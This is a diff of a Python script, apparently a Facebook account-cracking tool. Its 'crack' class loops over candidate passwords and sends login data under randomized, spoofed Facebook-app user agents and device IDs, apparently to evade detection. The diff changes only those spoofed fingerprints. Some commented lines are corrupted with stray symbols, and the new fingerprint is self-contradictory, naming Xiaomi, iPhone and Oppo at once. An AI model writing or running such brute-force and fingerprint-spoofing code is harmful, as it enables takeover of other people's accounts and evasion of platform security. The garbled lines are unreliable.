@@ -155,7 +155,7 @@ for xd in range(5000):
     application_version = str(random.randint(111,396))+'.0.0.'+str(random.randrange(10,49))+'.'+str(random.randint(111,396))
     V=str(random.randrange(11,99))
     uaku2=f'{aa} {bv}; {c}{d}{e}{f} Build/{d}{f}{V}{f}; wv) {g}{h}.{i}.{j}.{k} {l} [FBAN/EMA;FBLC/en_US;FBAV/{application_version};]'
-    #[FBAN/EMA;FBLC/en_US;FBAV/331.0.0.9.105;]'
+    #[FBAN/E#MA;FBLC#/en_US;F৳BAV/331.0#.0.9.%%105;]'
     #[FB_IAB/FB4A;FBAV/127.0.0.22.69;]'
     ugen.append(uaku2)
 
@@ -568,7 +568,7 @@ class crack:
         for pw in __juts__:
             try:
                 Mm = '\033[9;31m'
-                ua_string=random.choice(ugen3)
+                ua_string=random.choice(ugen)
                 application_version = str(random.randint(300,396))+'.0.0.'+str(random.randrange(10,49))+'.'+str(random.randint(111,396))
                 application_version_code=str(random.randint(000000000,999999999))
                 adid=str(uuid.uuid4())
@@ -580,7 +580,7 @@ class crack:
                 b=str(random.choice(string.ascii_uppercase))
                 gtt = random.choice(sm)+b+str(''.join(random.choice(string.digits) for _ in range(random.choice(uo)))+str(random.choice(string.ascii_uppercase)))
                 gttt=str(random.choice(string.ascii_uppercase))+str(random.randrange(11,99))+str(''.join(random.choice(string.ascii_uppercase) for _ in range(random.choice(uo))))
-                #ua_string = 'Sup#portsFresco=1 modular=3 Dalvik/2.1.0 (Linux; U; Android '+android_version+'; '+gtt#+' Build/'#+gttt#+') [FBAN/EMA;UNITY_PACKAGE/1549;FBBV/'#+application_version_code#+';FBAV/'#+application_version#+';FBDV/'#+gtt#+';FBLC/vi_VN;FBOP/20;FBNG/4G;FBCQ/UNKNOWN;FBMNT/METERED]'
+                #ua_string = '#Sup#portsFresco=1 modular=3 Dalvik/2.1.0 (Linux; U; Android '+android_version+'; '+gtt#+' Build/'#+gttt#+') [FBAN/EMA;UNITY_PACKAGE/1549;FBBV/'#+application_version_code#+';FBAV/'#+application_version#+';FBDV/'#+gtt#+';FBLC/vi_VN;FBOP/20;FBNG/4G;FBCQ/UNKNOWN;FBMNT/METERED]'
                 data = {
                     'locale':'en-US',
                     'client_country_code':'US',
@@ -722,7 +722,7 @@ class crack:
                 gtt = random.choice(sm)+b+str(''.join(random.choice(string.digits) for _ in range(random.choice(uo)))+str(random.choice(string.ascii_uppercase)))
                 gttt=str(random.choice(string.ascii_uppercase))+str(random.randrange(11,99))+str(''.join(random.choice(string.ascii_uppercase) for _ in range(random.choice(uo))))
                 net=random.choice(['ZONG', 'Jazz'])
-                ua_string = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=2.75,width=1080,height=2131};FBLC/en_US;FBRV/366716093;FBCR/Telenor;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
+                ua_string = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=2.5,width=720,height=1280};FBLC/zh_CN;FBRV/708023560;FBCR/Sony;FBMF/Xiaomi;FBBD/iPhone;FBPN/com.facebook.katana;FBDV/Oppo_Reno_8;FBSV/11;FBOP/8;FBCA/arm64-v8a;FBSS/;]'
                 device = str(uuid.uuid4())
                 adid = str(uuid.uuid4())
                 data = {
